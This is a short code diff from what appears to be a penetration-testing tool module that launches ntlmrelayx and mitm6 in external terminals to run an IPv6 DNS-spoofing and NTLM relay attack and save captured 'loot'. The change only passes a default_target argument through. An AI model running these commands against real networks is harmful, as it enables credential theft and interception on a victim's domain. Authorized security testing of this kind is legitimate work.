@@ -55,8 +55,8 @@ def main(apiclient, **kwargs):
 
     address = addrs[device][0].address
     cmd = f"sudo ntlmrelayx -tf {file_name} -6 -wh {address} -of {relaying_loot_path}/"
-    utils.executeInExternalTerm(f"'{cmd}'")
+    utils.executeInExternalTerm(f"'{cmd}'", default_target=kwargs.get("default_target", None))
     cmd = f"sudo mitm6 -i {device} -d {domain}"
-    utils.executeInExternalTerm(f"'{cmd}'")
+    utils.executeInExternalTerm(f"'{cmd}'", default_target=kwargs.get("default_target", None))
     return True, f"Listening ntlmrelayx with mittm6 opened, loot directory is here:"+str(relaying_loot_path)+"\n"
     
